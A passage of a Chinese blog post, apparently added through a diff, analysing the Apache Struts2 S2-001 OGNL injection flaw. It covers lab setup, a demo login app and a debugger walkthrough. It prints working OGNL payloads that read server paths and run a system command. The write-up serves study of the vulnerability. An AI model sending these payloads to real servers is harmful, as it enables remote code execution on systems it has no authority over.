+<li>运行<code>Action</code>，生成一个<code>Result</code>。</li>
+<li><code>Result</code>根据页面模板和标签库，生成要响应的内容。</li>
+<li>根据响应逆序调用拦截器，然后生成最终的响应并返回给Web服务器。</li>
+</ol>
+<h1>0x04 漏洞分析</h1>
+<p>官方公告：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-001">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
+<p>漏洞影响范围：WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8</p>
+<p>S2-001的漏洞原理是模板文件（JSP）中引用了不合适的标签进行渲染，并且渲染的值是用户可控的，此时则达成了表达式注入的目的。</p>
+<h2 id="漏洞环境搭建">漏洞环境搭建</h2>
+<p>Apache Tomcat/8.5.46+struts2（这个插件最新版）</p>
+<p>首先在idea安装Struts2插件（官方说2023.2之后就不在支持该插件，这里我是2023.1版本）</p>
+<p>这里在搭建环境也是遇到众多问题，因为现在的文章都是几年前的，idea也是老版本，对于我这个idea玩不明白的人，也是很费劲，搜了众多文章总算是解决了。</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418103413106.png" alt="image-20240418103413106"></p>
+<p>首先如上图所示创建一个新项目即可，新版不能直接创建Java ee，接着创建好的项目，添加技术框架支持</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418103455122.png" alt="image-20240418103455122"></p>
+<p>红色方框这里应该是有个web应用程序的（我这里已经添加过，因此不显示）接着选中Struts2，设置<strong>稍后设置库</strong></p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418103607692.png" alt="image-20240418103607692"></p>
+<p>下载struts-2.0.1-all，在项目目录 WEB-INF 下新建 lib 文件夹，将所需要的jar包从下载目录中导入到 lib 文件夹下，将全部jar包选中，右键 Add as Library</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418103736435.png" alt="image-20240418103736435"></p>
+<p>所需要的jar包如上图所示，下面的由于已经创建过，就借用个图</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418103827899.png" alt="image-20240418103827899"></p>
+<p>选中以上jar包，添加为库即可，名字任意。接着在项目结构的工件处，将该项目至于Output Root</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418103915661.png" alt="image-20240418103915661"></p>
+<p>最后创建Tomcat server（版本在8左右即可），设置好之后，在部署那一栏添加相应的war（可能不够详细，之后会放参考文章）</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418104040031.png" alt="image-20240418104040031"></p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418104055692.png" alt="image-20240418104055692"></p>
+<p>最后点击右上角的启动即可，成功的话会直接跳转到相应url，但如果显示不成功，除了程序本身的配置问题。看一下是否是使用了https协议，这里我们默认是http，因此你需要修改为http协议</p>
+<p>最后项目结构以及成功结果如下图所示</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418104250522.png" alt="image-20240418104250522"></p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418104307968.png" alt="image-20240418104307968"></p>
+<p>因为漏洞是在表单验证失败时发生的，这里继续编写一个表单验证的Demo，以复现漏洞。 在 WEB 目录下修改 index.jsp</p>
+<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page language="java" contentType="text/html; charset=UTF-8"
+         pageEncoding="UTF-8"%&gt;
+&lt;%@ taglib prefix="s" uri="/struts-tags" %&gt;
+
+&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+  &lt;title&gt;S2-001&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h2&gt;S2-001 Demo&lt;/h2&gt;
+&lt;p&gt;link: &lt;a href="https://cwiki.apache.org/confluence/display/WW/S2-001"&gt;https://cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;
+&lt;s:form action="login"&gt;
+  &lt;s:textfield name="username" label="username" /&gt;
+  &lt;s:textfield name="password" label="password" /&gt;
+  &lt;s:submit&gt;&lt;/s:submit&gt;
+&lt;/s:form&gt;
+&lt;/body&gt;
+&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后新建welcome.jsp</p>
+<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page language="java" contentType="text/html; charset=UTF-8"
+         pageEncoding="UTF-8"%&gt;
+&lt;%@ taglib prefix="s" uri="/struts-tags" %&gt;
+
+&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+  &lt;title&gt;S2-001&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;Hello &lt;s:property value="username"&gt;&lt;/s:property&gt;&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在 src 下新建 org.example package</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>opensymphony<span class="token punctuation">.</span>xwork2<span class="token punctuation">.</span></span><span class="token class-name">ActionSupport</span></span><span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LoginAction</span> <span class="token keyword">extends</span> <span class="token class-name">ActionSupport</span> <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token class-name">String</span> password <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUsername</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setPassword</span><span class="token punctuation">(</span><span class="token class-name">String</span> password<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>password <span class="token operator">=</span> password<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token string">"error"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token string">"error"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>修改Struts.xml</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">struts</span> <span class="token name">PUBLIC</span>
+        <span class="token string">"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span>
+        <span class="token string">"http://struts.apache.org/dtds/struts-2.0.dtd"</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>struts</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>package</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>S2-001<span class="token punctuation">"</span></span> <span class="token attr-name">extends</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>struts-default<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>action</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.example.LoginAction<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>success<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>welcome.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>result</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>index.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>result</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>action</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>package</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>struts</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>之后刷新运行，成功的话会出现登录demo</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418105521101.png" alt="image-20240418105521101"></p>
+<h2 id="漏洞复现">漏洞复现</h2>
+<p>获取Tomcat路径</p>
+<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token selector">%</span><span class="token punctuation">{</span><span class="token string">"tomcatBinDir{"</span>+@java.lang.System@<span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span>+<span class="token string">"}"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这里bp或者查看源码才能看到回显的路径（或者登录框）</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418110336591.png" alt="image-20240418110336591"></p>
+<p>获取web目录</p>
+<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">%<span class="token punctuation">{</span>#req=@org.apache.struts2.ServletActionContext@<span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response=#context.<span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span><span class="token punctuation">)</span>.<span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response.<span class="token function">println</span><span class="token punctuation">(</span>#req.<span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response.<span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response.<span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418105651749.png" alt="image-20240418105651749"></p>
+<p>执行命令</p>
+<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token selector">%</span><span class="token punctuation">{</span>#a=<span class="token punctuation">(</span>new java.lang.<span class="token function">ProcessBuilder</span><span class="token punctuation">(</span>new java.lang.String[]<span class="token punctuation">{</span><span class="token string">"whoami"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>.<span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>.<span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#b=#a.<span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#c=new java.io.<span class="token function">InputStreamReader</span><span class="token punctuation">(</span>#b<span class="token punctuation">)</span><span class="token punctuation">,</span>#d=new java.io.<span class="token function">BufferedReader</span><span class="token punctuation">(</span>#c<span class="token punctuation">)</span><span class="token punctuation">,</span>#e=new char[50000]<span class="token punctuation">,</span>#d.<span class="token function">read</span><span class="token punctuation">(</span>#e<span class="token punctuation">)</span><span class="token punctuation">,</span>#f=#context.<span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#f.<span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>.<span class="token function">println</span><span class="token punctuation">(</span>new java.lang.<span class="token function">String</span><span class="token punctuation">(</span>#e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#f.<span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>.<span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#f.<span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>.<span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418105851963.png" alt="image-20240418105851963"></p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>上面的漏洞复现有个特性就是，如果我们输入错的内容在输入框，那会保留错误的信息，如下图</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418110503466.png" alt="image-20240418110503466"></p>
+<p>发现错误的时候，输入的内容没有被清空，接下来输<code>%{1+1}</code>，如下图，发现被解析成2</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418110541828.png" alt="image-20240418110541828"></p>
+<p>从而利用这一特性，可以构造一些命令执行语句。</p>
+<p>该漏洞是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL 表达式 % {value} 进行解析，然后重新填充到对应的表单数据中。</p>
+<p>我们在OGNL表达式原生API getValue 处下断点，该方法用于解析OGNL表达式并返回表达式的值。</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418111712186.png" alt="image-20240418111712186"></p>
+<p>在输入框中输入payload之后，不断步出知道size=2，此时的调用栈就是漏洞发生的整个过程</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418112111385.png" alt="image-20240418112111385"></p>
+<p>下面我们就来逐步分析一下： 首先，判断%{1+1}是在何时被执行的，我们将断点设置在 LoginAction 的 setPassword 和 getPassword 方法上</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418112516200.png" alt="image-20240418112516200"></p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418112505477.png" alt="image-20240418112505477"></p>
+<p>然后，根据最开始的struts工作流程图可以知道在一个http请求进来后，会经过一系列的 拦截器 (Interceptor) ，这些拦截器可以是 Struts2 自带的，也可以是用户自定义的。例如 struts.xml文件中的 package 继承自 struts-default ，而 struts-default 就使用了 Struts2 自带的拦截器。</p>
+<p>在 struts2-core-2.0.1.jar/struts-default.xml 中可以找到默认使用的拦截器栈 defaultStack</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418112713851.png" alt="image-20240418112713851"></p>
+<p>在拦截器栈defaultStack中， 我们需要关注params这个拦截器。其中， <strong>params拦截器</strong>会将客户端请求数据设置到 <strong>值栈(valueStack)</strong> 中，后续 <strong>JSP</strong> 页面中所有的动态数据都将从值栈中取出。</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418112749241.png" alt="image-20240418112749241"></p>
+<p>该拦截器对应的权限定类名是 com.opensymphony.xwork2.interceptor.ParametersInterceptor，该拦截器会通过调用对应 Action 的 setter 方法来为其属性进行赋值；最后，对赋值进行判断，如果 password 的值为“%{1+1}”，则证明代码执行的行为发生在执行 Action 之后；如果 password 的值为 2，则证明代码执行的行为发生在 Action 执行之前。通过这种简单的判断就可以减少漏洞点的搜索范围：</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418114653551.png" alt="image-20240418114653551"></p>
+<p>如上图，当我们发送payload，发现复制完成之后。password值仍然是原型%{1+1}，这意味着，代码执行的行为发生在Action之后。意味着截止到执行完 ParametersInterceptor 拦截器为止，没有代码执行的行为发生。 接下来是执行 Action 的 execute 方法，最终结果是返回“error”字符串</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418114449668.png" alt="image-20240418114449668"></p>
+<p>根据Struts2整体执行流程。</p>
+<p>Action执行完毕后的步骤是操作对应的模板页面，当LoginAction的execute方法返回“error”字符串时， Struts2要去解析的模板页面是index.jsp。</p>
+<p>Struts2 支持多种模板引擎(freemarker、jsp、util、velocity、xslt)，jsp 只是其中一种。所以在真正开始解析之前，Struts2 还需要判断开发人员使用的模板引擎种类，从而调用对应的类和方法。</p>
+<p>负责处理 JSP 的类是 org.apache.struts2.views.jsp.ComponentTagSupport。解析会从第一个 Struts2 标签即<code>&lt;s:form action="Login"&gt;</code>开始，当解析到 ComponentTagSupport 类时，首先被调用的方法就是 doStartTag 方法，该方法的代码如下图所示。除 doStartTag 方法外，ComponentTagSupport 中 还有一个 doEndTag 方法，一个是解析标签开始时调用，另一个是解析到标签闭合时调用。</p>
+<h3 id="问题一">问题一</h3>
+<p>这里看了网上很多文章，可能是我基础不太行，加上众多师傅选择的依赖包版本是struts2-core-2.0.8.jar，而这里我是struts2-core-2.0.1.jar，于是找调试入口点，就找了半天，无从下手。这里也是选择了一种调试的方法（结合多个文章吧）</p>
+<p>我们先在自定义的action处下个断点，用来截停分析接受页面传来的数据</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418185734859.png" alt="image-20240418185734859"></p>
+<p>点击submit就会发现代码断点处接受到了传来的数据</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418185854439.png" alt="image-20240418185854439"></p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418185949219.png" alt="image-20240418185949219"></p>
+<p>从这里开始网上的很多文章就直接看调用栈了，说是下图中的DefaultActionInvocation类中反射调用了我们自定义的类 <code>LoginAction</code>。<br>
+路径：<code>/xwork-2.0.3.jar!/com/opensymphony/xwork2/DefaultActionInvocation.class</code></p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418190026777.png" alt="image-20240418190026777"></p>
+<p>但我直接跟进却看不出个所以然，这里我认为有两种办法，一个就是一个个点击调用栈，寻找谁调用了LoginAction这个类方法，或者就是直接F8跟随看一下各个参数的数据，寻找ActionLogin关键字，如下图，可以看到这里的invokeAction顾名思义或者看代码就能知道通过method.invoke调用了我们的自定义Action类</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418190415404.png" alt="image-20240418190415404"></p>
+<p>同时也能看到这里的method值是execute方法，也就是执行Action类下的execute方法。</p>
+<p>接下来可能就是马后炮了，网上的文章是根据Struts执行流程来分析整条链子（应该是经验丰富导致的思路），而对我这个小白很茫然，但我们不妨先跟着师傅们分析一下，随后看看有什么课后感想。</p>
+<p>根据其框架流程图，我们知道，当接受了一个http请求之后，会先经过一系列拦截器的执行，首先就是参考Struts.xml里面的代码，如下图所示，先是继承了一个struts-default这个Struts2自带的默认拦截器，我们找一下相应的文件</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418190815693.png" alt="image-20240418190815693"></p>
+<p>根据文章以及上面的分析我们也知道，这里要关注的是<code>params</code> 这个拦截器。其中， <code>params</code> 拦截器 会将客户端请求数据设置到 <code>值栈(valueStack)</code> 中</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418191406573.png" alt="image-20240418191406573"></p>
+<p>后续 <code>JSP</code> 页面中所有的动态数据都将从值栈中取出。那这一点我们如何来验证呢，下个断点即可</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418191550949.png" alt="image-20240418191550949"></p>
+<p>至于为什么是这个方法，我想是因为函数名称来定位的，这里顾名思义就是参数拦截器，而我们恰好是要找拦截器。并且其中的try代码块也涉及到了栈以及我们自定义Action的出现，我们下一个断点先</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418192044643.png" alt="image-20240418192044643"></p>
+<p>如上图可以看到，这里的函数参数中存在着password与username，显然这证明了我们客户端存入的数据被存入了ognl的值栈中。接着我们跟进对应的setParameters函数</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418194545200.png" alt="image-20240418194545200"></p>
+<p>while上面的逻辑，先是正常赋个值，ordered值默认就是false，看一下这里的TreeMap，根据GPT回答，这个类就是将传入的Map类对象parameters按照TreeMap对象自身的规则对这些键值对进行排序，然后赋值给params。</p>
+<p>接着通过entrySet方法获取params中的全部键值对</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418214737150.png" alt="image-20240418214737150"></p>
+<p>这里看一下while的逻辑，通过上面的iterator迭代器调用next获取当前条目，然后强转一下，调用entry的getkey获取当前条目的键，随后通过一条语句给acceptableName赋值，看一下acceptableName逻辑</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">boolean</span> <span class="token function">acceptableName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> name<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> name<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">44</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> name<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> name<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">58</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>根据GPT，这里就是判断name的值是否含有特殊字符：</p>
+<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">函数内部使用多个indexOf方法检查字符串name是否包含某些特殊字符（ASCII码值），即=（61）、<span class="token punctuation">,</span>（44）、#（35）和<span class="token punctuation">:</span>（58）。如果字符串name包含这些特殊字符中的任何一个，则该函数返回<span class="token boolean">false</span>；否则返回<span class="token boolean">true</span>。
+
+具体来说，indexOf方法用于查找指定字符第一次出现在字符串中的位置。如果未找到该字符，则返回-1。这里，我们检查name中是否包含特定字符，如果没有找到，就返回-1，表示不包含该字符，继续执行下一个检查。
+
+因此，这段代码实际上是判断字符串name中是否包含特定字符=、<span class="token punctuation">,</span>、#和<span class="token punctuation">:</span>，如果字符串中包含这些特殊字符，则返回<span class="token boolean">false</span>，否则返回<span class="token boolean">true</span>。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>显然这里我们的name是password，这样的话就能跳出while循环，接着通过getValue得到password的值<code>%{1+1}</code>，最后调用stack的setValue将我们输入的数据放入了值栈（这里可以跟进setValue看一下，大体就能知道个逻辑）</p>
+<p>现在我们回顾最开始的分析，可以确定这里在最后压入值栈的时候password的值还未被解析，这意味着这段代码的解析肯定是处于这些拦截器之后的，也就是说漏洞点发生在我们自定义Action执行之后，现在我们就理解了为何上述会去先判断漏洞发生点(不然范围太大了)，那接下来就是分析Action之后的代码了</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418215606124.png" alt="image-20240418215606124"></p>
+<p>回到我们自定义的Action，我们知道根据我们传入的数据，这里最后肯定返回的是error字符串，我们看一下Struts.xml对应的处理办法</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418220032925.png" alt="image-20240418220032925"></p>
+<p>可以看到转到index.jsp进行处理。我们的<strong>payload</strong>是从<code>index.jsp</code>输入的，这里需要了解的是<strong>jsp</strong>的本质也是一个<strong>Servlet</strong>，在执行jsp的时候<strong>tomcat</strong>会将其转化为java代码，比如这里<code>index.jsp</code>被转化为<code>index_jsp.java</code>。</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418220510832.png" alt="image-20240418220510832"></p>
+<p>负责处理 JSP 的类是 org.apache.struts2.views.jsp.ComponentTagSupport。解析会从第一个 Struts2 标签即<code>&lt;s:form action="Login"&gt;</code>开始，当解析到 ComponentTagSupport 类时，首先被调用的方法 就是 doStartTag 方法，该方法的代码如下图所示。除 doStartTag 方法外，ComponentTagSupport 中 还有一个 doEndTag 方法，一个是解析标签开始时调用，另一个是解析到标签闭合时调用。</p>
+<p>路径： <code>/org/apache/struts2/views/jsp/ComponentTagSupport.class</code></p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422200405260.png" alt="image-20240422200405260"></p>
